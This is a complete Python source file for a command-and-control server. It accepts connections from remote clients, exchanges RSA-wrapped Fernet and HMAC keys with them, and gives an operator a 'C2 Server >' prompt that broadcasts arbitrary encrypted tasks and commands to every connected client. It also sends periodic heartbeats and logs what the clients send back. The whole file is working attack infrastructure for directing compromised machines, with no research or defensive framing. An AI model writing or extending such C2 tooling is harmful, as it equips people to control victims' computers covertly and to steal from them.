import socket
import threading
import time
import json
import logging
from queue import Queue
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import serialization, hashes, hmac
from cryptography.hazmat.primitives.asymmetric import rsa, padding

class C2Server:
    def __init__(self, host='0.0.0.0', port=5000):
        self.host = host
        self.port = port
        self.private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048
        )
        self.public_key = self.private_key.public_key()
        self.clients = {}
        self.client_lock = threading.Lock()
        self.task_queue = Queue()
        
        logging.basicConfig(
            level=logging.DEBUG, 
            format='%(asctime)s - %(levelname)s: %(message)s',
            handlers=[
                logging.StreamHandler(),
                logging.FileHandler('logs/c2_server.log')
            ]
        )
        self.logger = logging.getLogger('C2Server')

    def admin_interface(self):
        """Command line interface for sending commands"""
        while True:
            try:
                command = input("\nC2 Server > ").strip()
                if not command:
                    continue

                if command == "list":
                    with self.client_lock:
                        print("\nConnected clients:")
                        for client in self.clients:
                            print(f" - {client}")
                    continue

                if command.startswith("task "):
                    try:
                        task_type, *payload = command[5:].split(":", 1)
                        task = {
                            'type': task_type,
                            'cmd': payload[0] if payload else None,
                            'timestamp': time.time()
                        }
                        self.add_task(task)
                    except Exception as e:
                        self.logger.error(f"Invalid task format: {e}")
                    continue

                print("Available commands:")
                print(" list - Show connected clients")
                print(" task <type>:<command> - Send task to clients")
                
            except KeyboardInterrupt:
                self.logger.info("Shutting down admin interface")
                break
            except Exception as e:
                self.logger.error(f"Admin interface error: {e}")
    
    def get_public_key_pem(self):
        return self.public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )
    
    def decrypt_asymmetric(self, encrypted_message):
        try:
            decrypted = self.private_key.decrypt(
                encrypted_message,
                padding.OAEP(
                    mgf=padding.MGF1(algorithm=hashes.SHA256()),
                    algorithm=hashes.SHA256(),
                    label=None
                )
            )
            return decrypted
        except Exception as e:
            self.logger.error(f"Asymmetric Decryption Error: {e}")
            raise
    
    def start_server(self):
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind((self.host, self.port))
        server_socket.listen(5)
        
        self.logger.info(f"Server listening on {self.host}:{self.port}")
        
        threading.Thread(target=self.task_dispatcher, daemon=True).start()
        
        while True:
            try:
                client_socket, address = server_socket.accept()
                self.logger.info(f"Connection from {address}")
                threading.Thread(
                    target=self.handle_client, 
                    args=(client_socket, address),
                    daemon=True
                ).start()
            except Exception as e:
                self.logger.error(f"Server accept error: {e}")
    
    def handle_client(self, client_socket, address):
        try:
            client_socket.sendall(b'READY_FOR_KEY_EXCHANGE')
            client_socket.settimeout(30)
            
            ready_confirm = client_socket.recv(1024)
            if ready_confirm != b'CLIENT_READY':
                raise ValueError("Client not ready for key exchange")
            
            client_socket.sendall(self.get_public_key_pem())
            
            symmetric_key_length = int(client_socket.recv(10).decode())
            hmac_key_length = int(client_socket.recv(10).decode())
            
            encrypted_symmetric_key = client_socket.recv(symmetric_key_length)
            encrypted_hmac_key = client_socket.recv(hmac_key_length)
            
            if not encrypted_symmetric_key or not encrypted_hmac_key:
                raise ValueError(f"Incomplete key transmission from {address}")
            
            symmetric_key = self.decrypt_asymmetric(encrypted_symmetric_key)
            hmac_key = self.decrypt_asymmetric(encrypted_hmac_key)
            
            client_socket.sendall(b'KEY_EXCHANGE_COMPLETE')
            
            with self.client_lock:
                client_id = f"{address[0]}:{address[1]}"
                self.clients[client_id] = {
                    'socket': client_socket,
                    'symmetric_key': symmetric_key,
                    'hmac_key': hmac_key
                }
            
            self.logger.info(f"Successful key exchange with {address}")
            self.handle_client_communication(client_id)
        
        except Exception as e:
            self.logger.error(f"Client handling error with {address}: {e}")
        finally:
            try:
                client_socket.close()
            except:
                pass
    
    def handle_client_communication(self, client_id):
        try:
            with self.client_lock:
                client_info = self.clients.get(client_id)
                if not client_info:
                    return
                client_socket = client_info['socket']
                symmetric_key = client_info['symmetric_key']
                hmac_key = client_info['hmac_key']
            
            cipher = Fernet(symmetric_key)
            
            while True:
                try:
                    length_bytes = client_socket.recv(4)
                    if len(length_bytes) != 4:
                        break
                    data_length = int.from_bytes(length_bytes, byteorder='big')
                    
                    encrypted_data = b''
                    while len(encrypted_data) < data_length:
                        chunk = client_socket.recv(data_length - len(encrypted_data))
                        if not chunk:
                            break
                        encrypted_data += chunk
                    
                    if len(encrypted_data) != data_length:
                        break
                    
                    encrypted_hmac = client_socket.recv(32)
                    if len(encrypted_hmac) != 32:
                        break
                    
                    h = hmac.HMAC(hmac_key, hashes.SHA256())
                    h.update(encrypted_data)
                    try:
                        h.verify(encrypted_hmac)
                    except Exception:
                        continue
                    
                    decrypted_data = cipher.decrypt(encrypted_data).decode()
                    response = json.loads(decrypted_data)
                    self.logger.info(f"Received from {client_id}: {response}")
                
                except Exception as e:
                    self.logger.error(f"Error with {client_id}: {e}")
                    break
            
            with self.client_lock:
                if client_id in self.clients:
                    del self.clients[client_id]
            self.logger.info(f"Client {client_id} disconnected")
        
        except Exception as e:
            self.logger.error(f"Unexpected error with {client_id}: {e}")
        finally:
            try:
                client_socket.close()
            except:
                pass
    
    def task_dispatcher(self):
        last_heartbeat = 0
        while True:
            try:
                # Check if we need to send heartbeats
                current_time = time.time()
                if current_time - last_heartbeat > 15:  # Send heartbeat every 15 seconds
                    heartbeat_task = {
                        'type': 'heartbeat',
                        'timestamp': current_time
                    }
                    with self.client_lock:
                        for client_id, client_info in list(self.clients.items()):
                            try:
                                encrypted_task = Fernet(client_info['symmetric_key']).encrypt(
                                    json.dumps(heartbeat_task).encode()
                                )
                                h = hmac.HMAC(client_info['hmac_key'], hashes.SHA256())
                                h.update(encrypted_task)
                                task_hmac = h.finalize()
                                
                                data_length = len(encrypted_task).to_bytes(4, 'big')
                                client_info['socket'].sendall(data_length)
                                client_info['socket'].sendall(encrypted_task)
                                client_info['socket'].sendall(task_hmac)
                            except Exception as e:
                                self.logger.error(f"Failed to send heartbeat to {client_id}: {e}")
                                del self.clients[client_id]
                    last_heartbeat = current_time

                # Process tasks from queue
                if not self.task_queue.empty():
                    task = self.task_queue.get()
                    
                    with self.client_lock:
                        for client_id, client_info in list(self.clients.items()):
                            try:
                                encrypted_task = Fernet(client_info['symmetric_key']).encrypt(
                                    json.dumps(task).encode()
                                )
                                h = hmac.HMAC(client_info['hmac_key'], hashes.SHA256())
                                h.update(encrypted_task)
                                task_hmac = h.finalize()
                                
                                data_length = len(encrypted_task).to_bytes(4, 'big')
                                client_info['socket'].sendall(data_length)
                                client_info['socket'].sendall(encrypted_task)
                                client_info['socket'].sendall(task_hmac)
                            except Exception as e:
                                self.logger.error(f"Failed to send task to {client_id}: {e}")
                                del self.clients[client_id]
                
                time.sleep(1)
            except Exception as e:
                self.logger.error(f"Task dispatcher error: {e}")
                time.sleep(5)
    
    def add_task(self, task):
        self.task_queue.put(task)
        self.logger.info(f"Task added: {task}")

def main():
    server = C2Server()
    # Start server in a separate thread
    server_thread = threading.Thread(target=server.start_server, daemon=True)
    server_thread.start()
    
    # Start admin interface in main thread
    server.admin_interface()

if __name__ == '__main__':
    main()